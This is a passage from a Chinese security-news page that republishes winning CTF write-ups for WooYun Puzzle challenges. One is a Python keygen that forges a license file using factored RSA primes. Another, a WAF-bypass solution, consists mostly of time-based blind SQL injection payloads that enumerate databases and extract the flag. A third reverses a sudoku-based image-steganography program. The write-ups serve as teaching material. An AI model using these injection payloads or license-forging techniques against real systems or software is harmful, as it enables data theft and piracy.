    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
    0xf3b97148, 0x84be41de,    0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,    0x14015c4f, 0x63066cd9,
    0xfa0f3d63, 0x8d080df5,    0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,    0x35b5a8fa, 0x42b2986c,
    0xdbbbc9d6, 0xacbcf940,    0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
    0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,    0x76dc4190, 0x01db7106,
    0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
    0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
    0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
    0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
    0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
    0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
    0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
    0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
    0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
    0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
    0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
    0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
    0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
    0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
    0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
    0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d]
    crc = -1
    for d in data:
        crc = ctypes.c_int(tab[(crc ^ ord(d)) &amp; 0xFF] ^ (crc &gt;&gt; 8)).value
    return ~crc

def egcd(a, b):
   if a == 0:
       return (b, 0, 1)
   else:
       g, y, x = egcd(b % a, a)
       return (g, x - (b // a) * y, y)

def modinv(a, m):
   g, x, y = egcd(a, m)
   if g != 1:
       raise Exception('modular inverse does not exist')
   else:
       return x % m

primes = [661333217825639141012939,1174612726422110624673683,702520810094682184952891,714443298299371048348643,906501779286561612666587]
e = 0x10001
def rsamp_fucrypt(data):
    N = reduce(lambda x,y:x*y, primes)
    phi = reduce(lambda x,y:x*(y-1), primes, 1)
    d = modinv(e, phi)
    ans = pow(int(data.encode('hex'), 16), d, N)
    ans = hex(ans)[2:].rstrip('L')
    if len(ans) % 2: ans = '0' + ans
    return ans.decode('hex')

def encode_license(key):
    data = struct.pack('&lt;II', 0xF9110700, 0xAE13ABF6) + hashlib.md5(key).digest() + rsamp_fucrypt(key)
    encoded = hashlib.md5(data).digest() + data
    return struct.pack('&lt;i',fake_crc(encoded)) + encoded

with open('wooyun.lic','wb') as fp:
    fp.write(encode_license('xVAH6xh67H34IaBPZpKqtIdO9vrqbP9P'))</code></pre>
<h3>Trivia</h3>
<p>checkkey.exe中实现的高精度减法处理借位的时候有一个小bug，导致取模在一些边界情况下也是错的。比如$2^{65537} \mod N$就算不对。 不过实际解题时需要的计算并不会遇上这样的边界问题 <img src="https://www.secpulse.com/wp-includes/images/smilies/simple-smile.png" alt=":-)" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>3、绕 waf 获取 flag</h2>
<blockquote><p>绕 waf 获取 flag：<a href="http://rile.gou.gg/" target="_blank">http://rile.gou.gg/</a></p></blockquote>
<h4>绕 waf 获取 flag 第一名的 writeup</h4>
<p>加'报错：</p>
<p>sql error: u"select * from books where title like '%a'%' limit 3 offset 0"<br />
非显错模式。</p>
<p>加 and ，返回错误信息bad request, hacker.</p>
<p>把关键字统统堆上去，发现过滤了and or xor union limit，未过滤select information_schema等。</p>
<p>注入点在末尾，闭合语句后使用procedure analyse语句进行报错：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,version())),1)+%23</p>
<p>果然出现错误页面，证明方法有效。</p>
<p>修改为延时注入：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(ascii(mid('1',1,1))&gt;0,benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>发现确有延时，证明注入位置无误。</p>
<p>构造爆库语句：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(ascii(mid((select+group_concat(DISTINCT+table_schema)+as+g+from+information_schema.tables),1,1))&gt;0,benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(length((select+group_concat(DISTINCT+table_schema)+as+g+from+information_schema.tables))&gt;0,benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>测试得知，长度为23：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(length((select+group_concat(DISTINCT+table_schema)+as+g+from+information_schema.tables))=23,benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>猜测第一个库为information_schema：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(ascii(mid((select+group_concat(DISTINCT+table_schema)+as+g+from+information_schema.tables),1,1))=ascii('i'),benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>返回正确，循环猜测得到结果：</p>
<p>information_schema,test</p>
<p>用同样的方式构造爆表语句：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(((select+group_concat(DISTINCT+table_schema)+as+g+from+information_schema.tables))='information_schema,test',benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(length((select+group_concat(DISTINCT+table_name)+as+g+from+information_schema.tables+where+table_name='test'))&gt;0,benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>获取长度为10：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(length((select+group_concat(DISTINCT+table_name)+as+g+from+information_schema.tables+where+table_schema='test'))=10,benchmark(9000000,sha(11)),1)))),1)%23</p>
<p>由错误回显得知一个已知表为books，猜测其为第一个表：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(ascii(mid((select+group_concat(DISTINCT+table_name)+as+g+from+information_schema.tables+where+table_schema='test'),1,1))=ascii('b'),benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>猜测得知第二个表首字母为f，猜测其全名为flag</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(((select+group_concat(DISTINCT+table_name)+as+g+from+information_schema.tables+where+table_schema='test'))='books,flag',benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>返回正确，得到表名：</p>
<p>books,flag</p>
<p>猜测flag表内只有一个字段，且仅有一条记录，则有：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(length((select+*+from+flag))&gt;0,benchmark(9000000,sha(1)),1)))),1)%23</p>
<p>返回正确，猜测成立。</p>
<p>获取长度为26：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if(length((select+*+from+flag))=26,benchmark(9000000,sha(1)),1)))),1)%23</p>
<p>循环猜测每一位：</p>
<p>a%'+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((mid((select+*+from+flag),1,1))='f',benchmark(5000000,sha(1)),1)))),1)%23</p>
<p>最终获取结果：</p>
<p>flag{9g7pgwdjeg8p4opz0gik}</p>
<h5>writeup by zcgonvh 18日 23:35</h5>
<p>&nbsp;</p>
<div class="row block">
<h2>4、这道数独中隐藏了什么信息？</h2>
<blockquote><p>提示：请分析附带的可执行文件，结合图片，恢复相关信息</p></blockquote>
</div>
<blockquote>
<div class="col l6 m12 s12 download-link"><a href="http://static.wooyun.org/summit/binaries.7z"><i class="mdi-file-file-download"></i> 点击下载 binaries.7z</a></div>
<div class="col l6 m12 s12 download-link"></div>
</blockquote>
<h4>数独 第一名的 writeup</h4>
<p>解出来的数独矩阵：<br />
1,2,6,7,3,9,4,5,8<br />
9,7,5,6,8,4,1,3,2<br />
4,8,3,2,1,5,6,9,7<br />
2,9,4,5,6,3,7,8,1<br />
3,5,8,4,7,1,9,2,6<br />
6,1,7,9,2,8,3,4,5<br />
5,3,1,8,9,7,2,6,4<br />
7,4,2,3,5,6,8,1,9<br />
8,6,9,1,4,2,5,7,3</p>
<p>一、简述及分析</p>
<p>给出了3个程序和一个图片，大概看了看，3个程序逻辑应该是一样的：</p>
<p>程序中包含一串text字符串，和一个数独矩阵，先用text生产一个164Byte的msg：</p>
<p>msg[i]=(text[i]&amp;0xf)/9<br />
msg[i+1]= (text[i]&amp;0xf)%9<br />
msg[i+2]= (text[i]&gt;&gt;4)/9<br />
msg[i+3]= (text[i]&gt;&gt;4)%9</p>
<p>反正大概就是这么个意思。<br />
打开图片input.bmp，分别读出像素的点数据，分别按n%3 分别对RGB三个值做变换(n为像素点编号)：</p>
<p>按n%3分别取弟(n/3)%9 个 行、列或矩阵(我这么叫，就是数独种那个小的方块)，生成一个九个数字的序列 L。<br />
大概就是n%3==0:<br />
取弟(n/3)%9 行<br />
n%3=1:<br />
取弟(n/3)%9 列<br />
n%3=2:<br />
取弟(n/3)%9 个小方块</p>
<p>再用 L[msg[n%0xa4]]作为一个偏移量对像素值进行偏移，偏移方法为：</p>
<p>9*(r/9) + L[msg[n%0xa4]]，如果超过0xff，就-9，使其在0xff有效范围内。<br />
变换后保存图片为soduku.bmp</p>
<p>给出的图名为soduku.bmp，是经过这个程序处理过的(背景像素点色差很明显)，拿到程序分析半天没明白是要干嘛，后来发现raspberry2.elf这个文件没有strip，还有些符号信息，包括几个变量(text,msg什么的)，经这些启发，猜想是soduku.</p>
<p>bmp这个图片经过同样的算法处理，但是soduku或者text不一样(或者两者都不一样)。</p>
<p>二、开始一顿乱试</p>
<p>先试试用程序里的那个矩阵尝试恢复text，用程序里的矩阵试了试，跑了下有大量冲突，明显不对，然后猜想是图片给出那个数独，把那个数独解出来再试，还是不成。</p>
<p>至于要确认像素变换后的偏移值也很容易，只利用上面那一点白边就够了，（假设原始图片白色部分像素(255,255,255)，希望吧，不是我也没办法） ，变换后就在 253-255,247-252这个范围内，是可以还原出来的。</p>
<p>一天没思路去忙别的去了，今天又分析了下，发现msg这个是有一定特征的，因为text这个字符串如果是可打印的话每组msg的第三位一定是0 (text[i]&gt;&gt;4/9)，用这个可以确定出矩阵第一行、第一列和没个小矩阵第一个数字，但是一行、一列中的数字相关性很高，虽然有这么多数字依然不能确定，数独的解不唯一，后来想的办法是对text一位一位的爆破(只爆破了hexdigits)，使用的条件除了不冲突以外(按照msg第三位为0，和各位text确定的数独矩阵值不会冲突)，再加上了数独本身特性的条件(同一行、一列、一个小矩阵不会重复)，发现在hexdigits的空间下每位刚好有唯一解，然后分分钟就能解出text，发现这时数独矩阵还没完全填满，就找了个程序把他解出来，然后又用完整的数独解了一遍，结果是一样的。</p>
<p><a href="http://static.wooyun.org/summit/getsd.py">查看附件</a></p>
<p>三、完</p>
<p>还看什么看，真的完了。</p>
<p>最终的flag：1aed56787db88808434ed857e200507c4de68ef3</p>
<h5>writeup by 高冷吴大神的脑残粉8</h5>
<p>[原题：<a href="http://summit.wooyun.org/puzzle/detail" target="_blank">Wooyun Puzzle</a>  安全脉搏SP小编整理发布】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/checkkey-exe" rel="tag">checkkey.exe</a><a href="https://www.secpulse.com/archives/tag/crptomat" rel="tag">CrptoMat</a><a href="https://www.secpulse.com/archives/tag/crptomat-exe" rel="tag">CrptoMat.exe</a><a href="https://www.secpulse.com/archives/tag/cryptomat_new" rel="tag">CryptoMat_new</a><a href="https://www.secpulse.com/archives/tag/darksn0w" rel="tag">darksn0w</a><a href="https://www.secpulse.com/archives/tag/enc-bin" rel="tag">enc.bin</a><a href="https://www.secpulse.com/archives/tag/give-me-five" rel="tag">give me five</a><a href="https://www.secpulse.com/archives/tag/givemefive-apk" rel="tag">givemefive.apk</a><a href="https://www.secpulse.com/archives/tag/msieve" rel="tag">msieve</a><a href="https://www.secpulse.com/archives/tag/riatre" rel="tag">Riatre</a><a href="https://www.secpulse.com/archives/tag/rsa-mp" rel="tag">RSA-MP</a><a href="https://www.secpulse.com/archives/tag/wooyun-lic" rel="tag">wooyun.lic</a><a href="https://www.secpulse.com/archives/tag/yafu" rel="tag">yafu</a><a href="https://www.secpulse.com/archives/tag/yet-another-factoring-utility" rel="tag">Yet Another Factoring Utility</a><a href="https://www.secpulse.com/archives/tag/zcgonvh" rel="tag">zcgonvh</a><a href="https://www.secpulse.com/archives/tag/%e7%aa%81%e7%a0%b4-no-wall" rel="tag">突破 No Wall</a><a href="https://www.secpulse.com/archives/tag/%e9%9f%b3%e9%a2%91%e9%9a%90%e5%86%99%e6%9c%af" rel="tag">音频隐写术</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/6352.html" title="详细阅读 webshell系列(一)&#8211;xml">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2015/05/cloud_hack.png&h=150&w=249&zc=1" alt="webshell系列(一)&#8211;xml" class="xg-img"/>
		<p>webshell系列(一)&#8211;&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/6301.html" title="详细阅读 NTDS.dit密码快速提取工具">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2015/04/ntds.png&h=150&w=249&zc=1" alt="NTDS.dit密码快速提取工具" class="xg-img"/>
		<p>NTDS.dit密码快速提取工具</P></a></li>
				<li><a href="https://www.secpulse.com/archives/60244.html" title="详细阅读 2017 ISG 管理运维赛 官方Writeup">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/09/ISG.jpg&h=150&w=249&zc=1" alt="2017 ISG 管理运维赛 官方Writeup" class="xg-img"/>
		<p>2017 ISG 管理运维赛 官方Wri</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='34889' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="10c23f223f" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="199"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/34889.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/01/spediator-150x150.jpg" width="96" height="96" alt="SP小编" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/sp_editor" title="由SP小编发布" rel="author">SP小编</a><br>
 <span class="au-title">总共218篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
交流和分享以及愉快的玩耍	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/35411.html" rel="bookmark" title="详细阅读 迅雷某离线服务器Redis未授权访问">迅雷某离线服务器Redis未授权访问</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/13721.html" rel="bookmark" title="详细阅读 全国大学生就业一站式服务系统SQL注入">全国大学生就业一站式服务系统SQL注入</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/17399.html" rel="bookmark" title="详细阅读 百度某重要应用struts2命令执行漏洞！">百度某重要应用struts2命令执行漏洞！</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/29795.html" rel="bookmark" title="详细阅读 盛大某游戏GM工具注入进入后台">盛大某游戏GM工具注入进入后台</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/8781.html" rel="bookmark" title="详细阅读 土豆网分站struts命令执行漏洞">土豆网分站struts命令执行漏洞</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
				alt="阿里安全中心" width="150px" height="45px">
			</a>
			
			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/yaqnew.png" alt="腾讯御安全"
				width="140px" height="45px">
			</a>
			
			<a href="http://www.4hou.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/4hou.png"
				alt="嘶吼RoarTalk" width="150px" height="45px">
			</a>
			
			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/ichunqiu.png" alt="i春秋学院"
				width="140px" height="45px">
			</a>

			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/bigsec.png" alt="bigsec岂安科技"
				width="140px" height="45px">
			</a>
		
			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/milw0rm.png"
				alt="Milw0rm Team" width="120px" height="40px">
			</a>


			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/cloversec.png"
				alt="四叶草安全" width="130px" height="45px">
			</a>
			<a href="https://www.aqdog.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/aqdog.png"
				alt="安犬云平台" width="140px" height="45px">
			</a>
			
			<a href="http://www.e365.org/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/e365.png"
				alt="易安在线" width="130px" height="45px">
			</a>
			
			
			

		</ul>
	</div>
</div>
<footer class="footer clr" id="footer">
	<div class="inner inner-footer">
		<div class="footer-secpulse">
			<h3>SecPulse</h3>
			<ul>
				<li><a href="/about">关于SecPulse</a></li>
				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
				<li><a href="/hire">加入我们</a></li>
				<li><a href="/report">寻求报道</a></li>
				<li><a href="/contact-us">联系我们</a></li>
			</ul>
		</div>
		<div class="footer-subscribe xs-hidden">
			<h3>订阅</h3>
			<ul>
				<li><a href="/feed">RSS订阅</a></li>
				<li><a href="/feed">邮箱订阅</a></li>
				<li><a href="/feed">线下活动订阅</a></li>
				<li></li>
				<li><a href="http://weibo.com/311057789">官方微博</a></li>
				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
			</ul>
		</div>
		<div class="footer-partner">
			<h3>全力驱动</h3>
			<ul class="cf">
				<li><a href="https://www.secpulse.com" class="external"
					target="_blank"><img
						src="https://www.secpulse.com/wp-content/uploads/seclogo.png"
						alt="安全脉搏" width="200px"></a></li>
			</ul>
		</div>
		<div class="footer-copyright xs-hidden">
			<p>本站由SecPulse安全脉搏团队全力维护。</p>
			<p>
				Powered By <a title="安全脉搏" href="https://www.secpulse.com">SecPulse</a>
			</p>
			<p>©2013-2017 安全脉搏</p>
			<p>沪ICP备16016474号</p>
			<img src="https://www.secpulse.com/wp-includes/images/qrcode.jpg"
				alt="Qrcode" height="150px" width="150px">

		</div>
	</div>
</footer>
<div id="shangxia">
	<div id="shang" title="↑ 返回顶部"></div>
              <div id="comt" title="查看评论"></div>
              <div id="xia" title="↓ 移至底部"></div>
</div>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2'></script>
</body>

</html>
